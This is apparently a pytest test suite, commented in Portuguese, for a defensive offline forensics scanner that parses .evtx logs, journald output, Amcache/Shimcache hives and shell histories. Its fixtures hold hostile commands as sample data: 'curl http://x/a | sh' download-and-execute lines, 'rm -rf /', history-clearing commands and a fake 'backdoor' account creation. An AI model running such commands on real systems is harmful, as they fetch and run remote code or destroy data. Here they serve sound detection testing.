"""Forense offline: .evtx, journald, hives (Amcache/Shimcache) e despacho por tipo de arquivo.

Os testes que dependem do Windows de verdade (wevtutil epl, RegLoadAppKey) são ignorados em outros SOs.
Os hives dos testes são REAIS (escritos pelo Windows), mas sintéticos: Amcache/SYSTEM reais exigem administrador.
"""
import ctypes
import gzip
import os
import subprocess
import sys
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from dupin_scan import forensics as fx

WINDOWS = os.name == "nt"
NOW = datetime(2026, 11, 11, 12, 0, 0)


# ------------------------------------------------------------ utilidades
def completed(stdout="", returncode=0, stderr=""):
    return subprocess.CompletedProcess(["journalctl"], returncode, stdout, stderr)


def journal(dt, texto, off="+0000"):
    return f"{dt.strftime('%Y-%m-%dT%H:%M:%S')}{off} srv {texto}"


def falhas_journal(n=12, ip="8.8.8.8", proc="sshd"):
    t = NOW - timedelta(hours=1)
    return [journal(t + timedelta(seconds=i), f"{proc}[100]: Failed password for invalid user admin from {ip} port {4000 + i} ssh2")
            for i in range(n)]


def export_evtx(tmp_path, channel="System", query="*[System[(EventID=7045)]]"):
    """Exporta um .evtx REAL com o wevtutil (não exige administrador nos canais System/Application)."""
    pytest.importorskip("Evtx.Evtx", reason="python-evtx não instalado")
    if not WINDOWS:
        pytest.skip("wevtutil só existe no Windows")
    out = tmp_path / f"{channel}.evtx"
    r = subprocess.run(["wevtutil", "epl", channel, str(out), f"/q:{query}", "/ow:true"], capture_output=True)
    if r.returncode != 0 or not out.exists():
        pytest.skip("wevtutil epl não pôde exportar o log")
    return out


def make_app_hive(path, populate):
    """Cria um hive REAL (regf) sem privilégio, com RegLoadAppKey; `populate(handle, winreg)` grava as chaves."""
    import winreg
    from ctypes import wintypes
    adv = ctypes.WinDLL("advapi32", use_last_error=True)
    adv.RegLoadAppKeyW.argtypes = [wintypes.LPCWSTR, ctypes.POINTER(wintypes.HKEY), wintypes.DWORD, wintypes.DWORD, wintypes.DWORD]
    adv.RegLoadAppKeyW.restype = wintypes.LONG
    h = wintypes.HKEY()
    if adv.RegLoadAppKeyW(str(path), ctypes.byref(h), 0xF003F, 0, 0) != 0:
        pytest.skip("RegLoadAppKey indisponível neste ambiente")
    try:
        populate(h.value, winreg)
        winreg.FlushKey(h.value)
    finally:
        adv.RegCloseKey(h)
    return path


def populate_amcache(handle, winreg):
    entradas = {
        "0000aaaa": {"LowerCaseLongPath": r"c:\users\public\evil.exe", "Name": "evil.exe", "Publisher": "", "FileId": "0000" + "ab" * 20},
        "0000bbbb": {"LowerCaseLongPath": r"c:\tools\mimikatz.exe", "Name": "mimikatz.exe", "Publisher": "", "FileId": "0000" + "cd" * 20},
        "0000cccc": {"LowerCaseLongPath": r"c:\program files\app\ok.exe", "Name": "ok.exe", "Publisher": "Contoso", "FileId": "0000" + "ef" * 20},
    }
    for k, vals in entradas.items():
        with winreg.CreateKeyEx(handle, rf"Root\InventoryApplicationFile\{k}", 0, winreg.KEY_ALL_ACCESS) as key:
            for n, v in vals.items():
                winreg.SetValueEx(key, n, 0, winreg.REG_SZ, v)


# ------------------------------------------------------------ .evtx (arquivos reais exportados pelo wevtutil)
def test_evtx_confere_com_o_wevtutil(tmp_path):
    f = export_evtx(tmp_path)
    mine = fx._evtx_events(f)
    raw = subprocess.run(["wevtutil", "qe", str(f), "/lf:true", "/f:xml"], capture_output=True).stdout
    ref = fx.parse_events(fx._decode(raw))
    if not ref:
        pytest.skip("este Windows não tem eventos 7045 para exportar")
    assert len(mine) == len(ref)
    assert sorted(e["record"] for e in mine) == sorted(e["record"] for e in ref)
    by_rec = {e["record"]: e for e in ref}
    for e in mine:
        r = by_rec[e["record"]]
        assert (e["id"], e["channel"], e["data"]) == (r["id"], r["channel"], r["data"])
        # python-evtx escreve '2026-08-20 11:06:01.991264+00:00'; o wevtutil '2026-08-20T11:06:01.9912662Z'
        assert abs(fx._win_dt(e["time"]) - fx._win_dt(r["time"])) < timedelta(seconds=1)


def test_evtx_janela_de_dias(tmp_path):
    f = export_evtx(tmp_path)
    todos = fx._evtx_events(f)
    if not todos:
        pytest.skip("este Windows não tem eventos 7045 para exportar")
    recentes = fx._evtx_events(f, days=1)
    assert len(recentes) <= len(todos)
    limite = datetime.now() - timedelta(days=1, hours=1)
    assert all(fx._win_dt(e["time"]) >= limite for e in recentes)
    assert len(fx._evtx_events(f, days=36500)) == len(todos)


def test_evtx_file_analisa_e_marca_origem(tmp_path):
    f = export_evtx(tmp_path)
    notes = []
    achados = fx.evtx_file(f, notes=notes)  # só garante que o pipeline completo roda; achados dependem do Windows
    assert isinstance(achados, list) and all(a["origin"] == f.name for a in achados)
    assert not any("não foi possível" in n for n in notes)


def test_evtx_corrompido_nao_derruba(tmp_path):
    f = export_evtx(tmp_path)
    dados = bytearray(f.read_bytes())
    if len(dados) < 0x12000:
        pytest.skip("arquivo pequeno demais para corromper")
    dados[0x10000 + 0x300:0x10000 + 0x600] = b"\xff" * 0x300  # estraga o meio do primeiro chunk
    ruim = tmp_path / "ruim.evtx"
    ruim.write_bytes(bytes(dados))
    fx._evtx_events(ruim, notes=[])  # não pode levantar exceção
    truncado = tmp_path / "truncado.evtx"
    truncado.write_bytes(bytes(dados[:0x10000 + 0x200]))
    fx._evtx_events(truncado, notes=[])


def test_evtx_assinatura_errada_vira_nota(tmp_path):
    pytest.importorskip("Evtx.Evtx", reason="python-evtx não instalado")
    f = tmp_path / "falso.evtx"
    f.write_bytes(b"isto nao e um evtx" * 50)
    notes = []
    assert fx._evtx_events(f, notes=notes) == [] and "não é um arquivo .evtx" in notes[0]


def test_evtx_sem_a_biblioteca_avisa(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "Evtx.Evtx", None)  # força ImportError
    notes = []
    assert fx.evtx_file(tmp_path / "x.evtx", notes=notes) == []
    assert "pip install python-evtx" in notes[0]


# ------------------------------------------------------------ journald
def test_parse_ts_offsets_com_e_sem_dois_pontos():
    a, b = fx._parse_ts("2026-11-10T12:00:00+0000", NOW), fx._parse_ts("2026-11-10T12:00:00+00:00", NOW)
    assert a is not None and a == b
    c, d = fx._parse_ts("2026-11-10T12:00:00-0300", NOW), fx._parse_ts("2026-11-10T12:00:00-03:00", NOW)
    assert c == d and c - a == timedelta(hours=3)
    assert fx._parse_ts("2026-11-10T12:00:00.123456789+0000", NOW) is not None


def test_journald_lines_monta_o_comando_certo(monkeypatch):
    visto = {}

    def fake(cmd, **kw):
        visto["cmd"] = cmd
        return completed("linha1\nlinha2\n")

    monkeypatch.setattr(fx.subprocess, "run", fake)
    assert fx.journald_lines(7) == ["linha1", "linha2"]
    cmd = visto["cmd"]
    assert cmd[:5] == ["journalctl", "-o", "short-iso", "--no-pager", "--since=-7d"]
    assert {c for c in cmd if c.startswith("_COMM=")} == {f"_COMM={c}" for c in
                                                          ("sshd", "sshd-session", "sudo", "useradd", "usermod", "gpasswd", "adduser")}


def test_journald_sem_journalctl_devolve_none_com_nota(monkeypatch):
    def fake(*a, **k):
        raise FileNotFoundError("journalctl")

    monkeypatch.setattr(fx.subprocess, "run", fake)
    notes = []
    assert fx.journald_lines(7, notes) is None and "não encontrado" in notes[0]


def test_journald_permissao_negada(monkeypatch):
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: completed("", 1, "Failed to open journal: Permission denied"))
    notes = []
    assert fx.journald_lines(7, notes) is None and "root" in notes[0]


def test_journald_aviso_de_resultado_incompleto(monkeypatch):
    hint = "Hint: You are currently not seeing messages from other users and the system."
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: completed("", 0, hint))
    notes = []
    assert fx.journald_lines(7, notes) == [] and "incompleto" in notes[0]


def test_linux_auth_usa_journald_sem_arquivos(monkeypatch):
    monkeypatch.setattr(fx, "_default_auth_files", lambda: [])
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: completed("\n".join(falhas_journal()) + "\n"))
    notes = []
    [f] = fx.linux_auth(notes=notes, now=NOW)
    assert f["source"] == "journald" and f["failures"] == 12 and f["attack"][0]["id"] == "T1110"
    assert not any("Nenhum log" in n for n in notes)


def test_linux_auth_journald_reconhece_sshd_session_e_offset(monkeypatch):
    t = NOW - timedelta(hours=1)
    linhas = falhas_journal(10, proc="sshd-session") + [
        journal(t + timedelta(minutes=5), "sshd-session[101]: Accepted password for root from 8.8.8.8 port 22 ssh2", off="-0300"),
        journal(t + timedelta(minutes=6), "useradd[200]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash"),
        journal(t + timedelta(minutes=7), "sudo[300]:    alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/sh -c 'curl http://x/a | sh'"),
        "-- No entries --",
    ]
    monkeypatch.setattr(fx, "_default_auth_files", lambda: [])
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: completed("\n".join(linhas)))
    achados = fx.linux_auth(now=NOW + timedelta(days=1))
    razoes = " | ".join(r for a in achados for r in a["reasons"])
    for esperado in ("falhas de autenticação", "Login bem-sucedido", "Login SSH como root", "Conta de usuário criada: backdoor",
                     "Download executado direto"):
        assert esperado in razoes, esperado
    assert all(a["source"] == "journald" for a in achados)


def test_linux_auth_arquivos_tem_prioridade_sobre_journald(tmp_path, monkeypatch):
    log = tmp_path / "auth.log"
    log.write_text("\n".join(falhas_journal()) + "\n")
    monkeypatch.setattr(fx, "_default_auth_files", lambda: [log])
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: pytest.fail("não deveria consultar o journald"))
    [f] = fx.linux_auth(now=NOW)
    assert f["source"] == "auth.log"


def test_linux_auth_sem_nada_mantem_o_aviso(monkeypatch):
    monkeypatch.setattr(fx, "_default_auth_files", lambda: [])

    def fake(*a, **k):
        raise FileNotFoundError("journalctl")

    monkeypatch.setattr(fx.subprocess, "run", fake)
    notes = []
    assert fx.linux_auth(notes=notes) == []
    assert any("Nenhum log de autenticação" in n for n in notes) and any("journald" in n for n in notes)


def test_linux_auth_paths_explicitos_nunca_consultam_o_journald(monkeypatch):
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: pytest.fail("não deveria consultar o journald"))
    notes = []
    assert fx.linux_auth(paths=[], notes=notes) == [] and any("Nenhum log" in n for n in notes)


def test_sshd_session_tambem_no_auth_log(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text("\n".join(falhas_journal(10, proc="sshd-session")) + "\n")
    assert len(fx.linux_auth(paths=[log], now=NOW)) == 1


# ------------------------------------------------------------ Amcache / Shimcache
# Formato do plugin `amcache` do regipy (as_json=True), como lido em regipy/plugins/amcache/amcache.py e confirmado
# num hive real com a estrutura \Root\InventoryApplicationFile.
AMCACHE_ENTRIES = [
    {"program_id": "ffff0000", "file_id": "ab" * 20, "lower_case_long_path": r"c:\users\public\evil.exe", "name": "evil.exe",
     "publisher": "", "size": 4096, "is_pe_file": True, "is_os_component": False, "sha1": "ab" * 20,
     "timestamp": "2026-11-10T12:00:00.500000+00:00"},
    {"lower_case_long_path": r"c:\tools\mimikatz.exe", "name": "mimikatz.exe", "sha1": "cd" * 20,
     "timestamp": "2026-11-09T08:00:00+00:00"},
    {"lower_case_long_path": r"c:\program files\app\ok.exe", "name": "ok.exe", "publisher": "Contoso", "sha1": "ef" * 20,
     "timestamp": "2026-11-09T08:00:00+00:00"},
    {"full_path": r"c:\windows\temp\legacy.exe", "sha1": "11" * 20, "last_modified_timestamp": "2026-01-01T00:00:00+00:00"},
]


def test_amcache_entradas_suspeitas_e_ferramentas():
    achados = {a["where"]: a for a in fx.analyze_amcache_entries(AMCACHE_ENTRIES + ["<NamedKey de volume>"])}
    assert set(achados) == {r"Amcache · c:\users\public\evil.exe", r"Amcache · c:\tools\mimikatz.exe",
                            r"Amcache · c:\windows\temp\legacy.exe"}
    evil = achados[r"Amcache · c:\users\public\evil.exe"]
    assert evil["source"] == "Amcache" and evil["type"] == "artifact" and evil["sha1"] == "ab" * 20
    assert evil["when"].startswith("2026-11-1") and "SHA-1" in evil["detail"]
    assert "diretório suspeito" in evil["reasons"][0]
    mimi = achados[r"Amcache · c:\tools\mimikatz.exe"]
    assert mimi["score"] == 80 and [t["id"] for t in mimi["attack"]] == ["T1003.001"]
    # as datas do regipy são UTC e `when` sai no fuso local (convertido pela mesma função, para o teste valer em qualquer fuso)
    assert achados[r"Amcache · c:\windows\temp\legacy.exe"]["when"] == fx._when(fx._win_dt("2026-01-01T00:00:00+00:00"))


def test_amcache_entrada_normal_nao_gera_achado():
    assert fx.analyze_amcache_entries([AMCACHE_ENTRIES[2]]) == []


# Formato do plugin `shimcache` (ShimCacheParser): Win7/8 {last_mod_date, path, exec_flag}; Win10 {last_mod_date, path};
# XP {last_mod_time, exec_time, path, file_size}.
SHIM_ENTRIES = [
    {"last_mod_date": "2026-11-10T12:00:00+00:00", "path": r"\??\C:\Users\Public\x.exe", "exec_flag": "True"},
    {"last_mod_date": "2026-11-10T12:00:00+00:00", "path": r"\??\C:\Users\Public\x.exe", "exec_flag": "True"},  # ControlSet002
    {"last_mod_date": "2026-11-08T10:00:00+00:00", "path": r"C:\Tools\PsExec64.exe"},
    {"last_mod_date": "2026-11-08T10:00:00+00:00", "path": r"C:\Windows\System32\notepad.exe"},
    {"last_mod_time": "2010-01-01T00:00:00+00:00", "exec_time": "2010-01-02T00:00:00+00:00",
     "path": r"C:\Documents and Settings\u\Local Settings\Temp\a.exe", "file_size": 10},
]


def test_shimcache_deduplica_e_descreve_a_data_com_honestidade():
    achados = fx.analyze_shimcache_entries(SHIM_ENTRIES)
    assert len(achados) == 3  # x.exe (1x), PsExec, a.exe (XP, last_mod_time); notepad não gera
    for a in achados:
        assert a["source"] == "Shimcache" and "não a execução" in a["detail"] and a["when"]
    psexec = next(a for a in achados if "PsExec" in a["where"])
    assert [t["id"] for t in psexec["attack"]] == ["T1569.002"] and "Registrado no Shimcache" in psexec["reasons"][0]


@pytest.mark.skipif(not WINDOWS, reason="hive real criado com RegLoadAppKey (Windows)")
def test_hive_amcache_real_de_ponta_a_ponta(tmp_path):
    pytest.importorskip("regipy", reason="regipy não instalado")
    hve = make_app_hive(tmp_path / "Amcache_teste.hve", populate_amcache)
    notes = []
    achados = fx.hive_file(hve, notes)
    onde = {a["where"] for a in achados}
    assert onde == {r"Amcache · c:\users\public\evil.exe", r"Amcache · c:\tools\mimikatz.exe"}, (onde, notes)
    assert all(a["origin"] == "Amcache_teste.hve" and a["when"] for a in achados)


@pytest.mark.skipif(not WINDOWS, reason="hive real criado com RegLoadAppKey (Windows)")
def test_hive_system_com_appcompatcache_invalido_vira_nota(tmp_path):
    pytest.importorskip("regipy", reason="regipy não instalado")

    def populate(h, winreg):
        with winreg.CreateKeyEx(h, "Select", 0, winreg.KEY_ALL_ACCESS) as k:
            winreg.SetValueEx(k, "Current", 0, winreg.REG_DWORD, 1)
        with winreg.CreateKeyEx(h, r"ControlSet001\Control\Session Manager\AppCompatCache", 0, winreg.KEY_ALL_ACCESS) as k:
            winreg.SetValueEx(k, "AppCompatCache", 0, winreg.REG_BINARY, b"\x01\x02\x03\x04" * 32)

    notes = []
    assert fx.hive_file(make_app_hive(tmp_path / "sys.hiv", populate), notes) == []
    assert any("Shimcache" in n and "não foi possível interpretar" in n for n in notes)


def test_hive_de_outro_tipo_explica(tmp_path):
    pytest.importorskip("regipy", reason="regipy não instalado")
    ntuser = Path(r"C:\Users\Default\NTUSER.DAT")
    if not (WINDOWS and ntuser.exists()):
        pytest.skip("sem um hive real de usuário para testar")
    try:
        copia = tmp_path / "NTUSER.DAT"
        copia.write_bytes(ntuser.read_bytes())
    except OSError:
        pytest.skip("hive padrão ilegível")
    notes = []
    assert fx.hive_file(copia, notes) == [] and "sem Amcache nem AppCompatCache" in notes[0]


def test_hive_invalido_vazio_e_truncado(tmp_path):
    pytest.importorskip("regipy", reason="regipy não instalado")
    notes = []
    lixo = tmp_path / "lixo.hve"
    lixo.write_bytes(b"isto nao e um hive" * 100)
    assert fx.hive_file(lixo, notes) == [] and "inválido ou corrompido" in notes[0]
    vazio = tmp_path / "vazio.hve"
    vazio.write_bytes(b"")
    assert fx.hive_file(vazio, notes) == [] and len(notes) == 2
    parcial = tmp_path / "parcial.hve"
    parcial.write_bytes(b"regf" + b"\0" * 100)
    assert fx.hive_file(parcial, notes) == []  # não pode levantar exceção


def test_hive_sem_permissao(tmp_path, monkeypatch):
    pytest.importorskip("regipy", reason="regipy não instalado")
    import regipy.registry as rr

    def nega(*a, **k):
        raise PermissionError("negado")

    monkeypatch.setattr(rr, "RegistryHive", nega)
    hve = tmp_path / "x.hve"
    hve.write_bytes(b"regf" + b"\0" * 100)
    notes = []
    assert fx.hive_file(hve, notes) == [] and "sem permissão" in notes[0]


def test_hive_sem_a_biblioteca_avisa(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "regipy.registry", None)
    notes = []
    assert fx.hive_file(tmp_path / "x.hve", notes) == [] and "pip install regipy" in notes[0]


def test_regipy_logger_e_restaurado():
    import logging
    lg = logging.getLogger("regipy")
    antes = lg.level
    with fx._quiet_regipy():
        assert lg.level == logging.CRITICAL
    assert lg.level == antes


# ------------------------------------------------------------ analyze_artifact_file (despacho)
def test_despacho_auth_log_e_gz_sem_janela_de_dias(tmp_path):
    antigo = [journal(datetime(2020, 5, 1, 10, 0, i), f"sshd[1]: Failed password for root from 8.8.8.8 port {i} ssh2") for i in range(12)]
    log = tmp_path / "auth.log.1"
    log.write_text("\n".join(antigo) + "\n")
    achados, notes = fx.analyze_artifact_file(log)  # sem `days`: logs coletados antigos não podem ser descartados
    assert len(achados) == 1 and achados[0]["failures"] == 12
    assert fx.analyze_artifact_file(log, days=30)[0] == []  # com janela, o log de 2020 fica de fora
    gz = tmp_path / "auth.log.2.gz"
    with gzip.open(gz, "wt") as f:
        f.write("\n".join(antigo) + "\n")
    assert len(fx.analyze_artifact_file(gz)[0]) == 1
    secure = tmp_path / "secure-20200501"
    secure.write_text("\n".join(antigo) + "\n")
    assert len(fx.analyze_artifact_file(secure)[0]) == 1


@pytest.mark.parametrize("nome,conteudo,esperado", [
    (".bash_history", "curl http://x/a | sh\n", "Download executado direto"),
    (".zsh_history", ": 1700000000:0;history -c\n", "Histórico do shell apagado"),
    ("fish_history", "- cmd: curl http://x/a | sh\n", "Download executado direto"),
    ("ConsoleHost_history.txt", "Clear-History\n", "Histórico do PowerShell apagado"),
])
def test_despacho_historicos(tmp_path, nome, conteudo, esperado):
    p = tmp_path / nome
    p.write_text(conteudo)
    achados, notes = fx.analyze_artifact_file(p)
    assert any(esperado in r for a in achados for r in a["reasons"]), (achados, notes)


def test_despacho_prefetch(tmp_path):
    ruim = tmp_path / "MIMIKATZ.EXE-1A2B3C4D.pf"
    ruim.write_bytes(b"")
    bom = tmp_path / "CHROME.EXE-ABCDEF01.pf"
    bom.write_bytes(b"")
    achados, _ = fx.analyze_artifact_file(ruim)
    assert [a["attack"][0]["id"] for a in achados] == ["T1003.001"]
    achados, notes = fx.analyze_artifact_file(bom)
    assert achados == [] and "não é interpretado" in notes[0]


def test_despacho_por_magic_bytes_nao_pelo_nome(tmp_path):
    pytest.importorskip("regipy", reason="regipy não instalado")
    p = tmp_path / "qualquer_nome.dat"
    p.write_bytes(b"regf" + b"\0" * 100)
    achados, notes = fx.analyze_artifact_file(p)  # magic regf -> vai para o analisador de hive, que reclama do conteúdo
    assert achados == [] and notes and "hive" in notes[0]


def test_despacho_evtx_com_assinatura_errada(tmp_path):
    pytest.importorskip("Evtx.Evtx", reason="python-evtx não instalado")
    p = tmp_path / "Security.evtx"
    p.write_bytes(b"x" * 200)
    achados, notes = fx.analyze_artifact_file(p)
    assert achados == [] and "não é um arquivo .evtx válido" in notes[0]


@pytest.mark.skipif(not WINDOWS, reason="wevtutil epl só no Windows")
def test_despacho_evtx_real(tmp_path):
    f = export_evtx(tmp_path)
    achados, notes = fx.analyze_artifact_file(f)
    assert isinstance(achados, list) and not any("não foi possível" in n for n in notes)


def test_despacho_tipo_desconhecido_e_inexistente(tmp_path):
    p = tmp_path / "foto.png"
    p.write_bytes(b"\x89PNG")
    achados, notes = fx.analyze_artifact_file(p)
    assert achados == [] and "não reconhecido" in notes[0]
    achados, notes = fx.analyze_artifact_file(tmp_path / "nao_existe.log")
    assert achados == [] and "não encontrado" in notes[0]


def test_despacho_recusa_arquivo_grande(tmp_path, monkeypatch):
    p = tmp_path / "auth.log"
    p.write_text("x" * 100)
    monkeypatch.setattr(fx, "MAX_ARTIFACT_BYTES", 50)
    achados, notes = fx.analyze_artifact_file(p)
    assert achados == [] and "excede o limite" in notes[0]


def test_despacho_historico_grande_usa_limite_proprio(tmp_path, monkeypatch):
    p = tmp_path / ".bash_history"
    p.write_text("curl http://x/a | sh\n" * 10)
    monkeypatch.setattr(fx, "MAX_HISTORY_BYTES", 50)
    achados, notes = fx.analyze_artifact_file(p)
    assert achados == [] and "excede o limite" in notes[0]


def test_despacho_nao_executa_nada(tmp_path, monkeypatch):
    """O arquivo é só lido: nenhum subprocesso é iniciado ao analisar um histórico ou um .pf."""
    monkeypatch.setattr(fx.subprocess, "run", lambda *a, **k: pytest.fail("não deveria executar nada"))
    p = tmp_path / ".bash_history"
    p.write_text("rm -rf /\ncurl http://x/a | sh\n")
    assert fx.analyze_artifact_file(p)[0]
